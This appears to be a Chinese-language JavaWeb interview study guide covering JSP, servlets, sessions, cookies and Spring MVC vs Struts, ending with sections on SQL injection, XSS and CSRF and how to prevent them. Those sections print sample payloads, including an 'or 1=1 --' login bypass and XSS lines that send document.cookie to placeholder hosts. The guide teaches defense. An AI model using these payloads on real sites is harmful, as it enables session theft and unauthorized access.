# JavaWeb

## 64.jsp 和 servlet 有什么区别？

- Servlet

一种服务器端的Java应用程序
由 Web 容器加载和管理
用于生成动态 Web 内容
负责处理客户端请求

- Jsp（Java Server Pages）

是 Servlet 的扩展，本质上还是 Servlet
每个 Jsp 页面就是一个 Servlet 实例
Jsp 页面会被 Web 容器编译成 Servlet，Servlet 再负责响应用户请求

- 区别

jsp更擅长表现于页面显示,servlet更擅长于逻辑控制.

Servlet中没有内置对象，Jsp中的内道置对象都是必须通过HttpServletRequest对象，HttpServletResponse对象以及HttpServlet对象得到.

Servlet的实现方式是在java代码中嵌入HTML代码，编写和修改HTML非常不方便，所以适合做流程控制和业务逻辑的处理;JSP实现的方式是在HTML中嵌入java代码，比较适合页面的显示。

## 65.jsp 有哪些内置对象？作用分别是什么？

JSP 有 9 大内置对象：

request：封装客户端的请求，其中包含来自 get 或 post 请求的参数；

response：封装服务器对客户端的响应；

pageContext：通过该对象可以获取其他对象；

session：封装用户会话的对象；

application：封装服务器运行环境的对象；

out：输出服务器响应的输出流对象；

config：Web 应用的配置对象；

page：JSP 页面本身（相当于 Java 程序中的 this）；

exception：封装页面抛出异常的对象。

## 66.说一下 jsp 的 4 种作用域？

首先要声明一点，所谓“作用域”就是“信息共享的范围”，也就是说一个信息能够在多大的范围内有效。

4个JSP内置对象的作用域分别为：page（页面作用域）、request（请求作用域）、session（会话作用域）、application（应用程序作用域）。

JSP内置对象作用域表如下：

| 名称        | 作用域               |
| ----------- | -------------------- |
| application | 在所有应用程序中有效 |
| session     | 在当前会话中有效     |
| request     | 在当前请求中有效     |
| page        | 在当前页面有效       |

## 67.session 和 cookie 有什么区别？

cookie是由Web服务器保存在用户浏览器上的小文件，包含有关用户的信息。
session是用来在客户端与服务器端之间保持状态的解决方案和存储结构

1、cookie数据存放在客户的浏览器上，session数据放在服务器上。
2、cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗，考虑到安全应当使用session。
3、session会在一定时间内保存在服务器上。当访问增多，会比较占用服务器的性能，考虑到服务器性能方面，应当使用cookie。
4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。
5、我认为将登陆信息等重要信息存放为session，其他信息如果需要保留，可以放在cookie中

## 68.说一下 session 的工作原理？

session 的工作原理是客户端登录完成之后，服务器会创建对应的 session，session 创建完之后，会把 session 的 id 发送给客户端，客户端再存储到浏览器中。这样客户端每次访问服务器时，都会带着 sessionid，服务器拿到 sessionid 之后，在内存找到与之对应的 session 这样就可以正常工作了。

## 69.如果客户端禁止 cookie 能实现 session 还能用吗？

一般默认情况下，在会话中，服务器存储 session 的 sessionid 是通过 cookie 存到浏览器里。

如果浏览器禁用了 cookie，浏览器请求服务器无法携带 sessionid，服务器无法识别请求中的用户身份，session失效。

但是可以通过其他方法在禁用 cookie 的情况下，可以继续使用session。

通过url重写，把 sessionid 作为参数追加的原 url 中，后续的浏览器与服务器交互中携带 sessionid 参数。
服务器的返回数据中包含 sessionid，浏览器发送请求时，携带 sessionid 参数。
通过 Http 协议其他 header 字段，服务器每次返回时设置该 header 字段信息，浏览器中 js 读取该 header 字段，请求服务器时，js设置携带该 header 字段。

## 70.spring mvc 和 struts 的区别是什么？

- 拦截机制的不同

Struts2是类级别的拦截，每次请求就会创建一个Action，和Spring整合时Struts2的ActionBean注入作用域是原型模式prototype，然后通过setter，getter吧request数据注入到属性。Struts2中，一个Action对应一个request，response上下文，在接收参数时，可以通过属性接收，这说明属性参数是让多个方法共享的。Struts2中Action的一个方法可以对应一个url，而其类属性却被所有方法共享，这也就无法用注解或其他方式标识其所属方法了，只能设计为多例。　

SpringMVC是方法级别的拦截，一个方法对应一个Request上下文，所以方法直接基本上是独立的，独享request，response数据。而每个方法同时又何一个url对应，参数的传递是直接注入到方法中的，是方法所独有的。处理结果通过ModeMap返回给框架。在Spring整合时，SpringMVC的Controller Bean默认单例模式Singleton，所以默认对所有的请求，只会创建一个Controller，有应为没有共享的属性，所以是线程安全的，如果要改变默认的作用域，需要添加@Scope注解修改。

Struts2有自己的拦截Interceptor机制，SpringMVC这是用的是独立的Aop方式，这样导致Struts2的配置文件量还是比SpringMVC大。

- 底层框架的不同

Struts2采用Filter（StrutsPrepareAndExecuteFilter）实现，SpringMVC（DispatcherServlet）则采用Servlet实现。Filter在容器启动之后即初始化；服务停止以后坠毁，晚于Servlet。Servlet在是在调用时初始化，先于Filter调用，服务停止后销毁。 

- 性能方面

Struts2是类级别的拦截，每次请求对应实例一个新的Action，需要加载所有的属性值注入，SpringMVC实现了零配置，由于SpringMVC基于方法的拦截，有加载一次单例模式bean注入。所以，SpringMVC开发效率和性能高于Struts2。

- 配置方面

spring MVC和Spring是无缝的。从这个项目的管理和安全上也比Struts2高。

## 71.如何避免 sql 注入？

1、概念

SQL 注入（SQL Injection），是 Web 开发中最常见的一种安全漏洞。

可以用它来从数据库获取敏感信息、利用数据库的特性执行添加用户、导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。

2、造成 SQL 注入的原因 

程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的 SQL 脚本，程序在接收后错误的将攻击者的输入作为 SQL 语句的一部分执行，导致原始的查询逻辑被改变，执行了攻击者精心构造的恶意 SQL 语句。

如 从用户表根据用户名 ConstXiong 和密码 123 查用户信息

```java
select * from user where username = 'ConstXiong' and password = '123'
恶意修改用户名参数 ConstXiong -> ConstXiong' or 1=1 --
select * from user where username = 'ConstXiong' or 1=1 --' and password = '123'
SQL 中 -- 是注释标记，如果上面这个 SQL 被执行，就可以让攻击者在不知道任何用户名和密码的情况下成功登录。
```

3、预防 SQL 注入攻击的方法

严格限制 Web 应用的数据库的操作权限，给连接数据库的用户提供满足需要的最低权限，最大限度的减少注入攻击对数据库的危害
校验参数的数据格式是否合法（可以使用正则或特殊字符的判断）
对进入数据库的特殊字符进行转义处理，或编码转换
预编译 SQL（Java 中使用 PreparedStatement），参数化查询方式，避免 SQL 拼接
发布前，利用工具进行 SQL 注入检测
报错信息不要包含 SQL 信息输出到 Web 页面

## 72.什么是 XSS 攻击，如何避免？

XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。 

原理

攻击者往 web 页面里插入恶意的 HTML 代码（Javascript、css、html 标签等），当用户浏览该页面时，嵌入其中的 HTML 代码会被执行，从而达到恶意攻击用户的目的。如盗取用户 cookie 执行一系列操作，破坏页面结构、重定向到其他网站等。 

种类

1、DOM Based XSS：基于网页 DOM 结构的攻击

例如：

input 标签 value 属性赋值

```js
//jsp
<input type="text" value="<%= getParameter("content") %>">
```

 访问

```js
http://xxx.xxx.xxx/search?content=<script>alert('XSS');</script>    //弹出 XSS 字样
http://xxx.xxx.xxx/search?content=<script>window.open("xxx.aaa.xxx?param="+document.cookie)</script>    //把当前页面的 cookie 发送到 xxxx.aaa.xxx 网站
```

利用 a 标签的 href 属性的赋值

```js
//jsp
<a href="escape(<%= getParameter("newUrl") %>)">跳转...</a>
```

访问

```js
http://xxx.xxx.xxx?newUrl=javascript:alert('XSS')    //点击 a 标签就会弹出 XSS 字样
变换大小写
http://xxx.xxx.xxx?newUrl=JAvaScript:alert('XSS')    //点击 a 标签就会弹出 XSS 字样
加空格
http://xxx.xxx.xxx?newUrl= JavaScript :alert('XSS')    //点击 a 标签就会弹出 XSS 字样
```

image 标签 src 属性，onload、onerror、onclick 事件中注入恶意代码

```html
<img src='xxx.xxx' onerror='javascript:window.open("http://aaa.xxx?param="+document.cookie)' />
```

2、Stored XSS：存储式XSS漏洞

```html
<form action="save.do">
	<input name="content" value="">
</form>
```

预防思路 

web 页面中可由用户输入的地方，如果对输入的数据转义、过滤处理
后台输出页面的时候，也需要对输出内容进行转义、过滤处理（因为攻击者可能通过其他方式把恶意脚本写入数据库）
前端对 html 标签属性、css 属性赋值的地方进行校验


注意：

各种语言都可以找到 escapeHTML() 方法可以转义 html 字符。

## 73.什么是 CSRF 攻击，如何避免？

CSRF：Cross Site Request Forgery（跨站点请求伪造）。
CSRF 攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。


CSRF 攻击实例

避免方法：

​	CSRF 漏洞进行检测的工具，如 CSRFTester、CSRF Request Builder...
​	验证 HTTP Referer 字段
​	添加并验证 token
​	添加自定义 http 请求头
​	敏感操作添加验证码
​	使用 post 请求

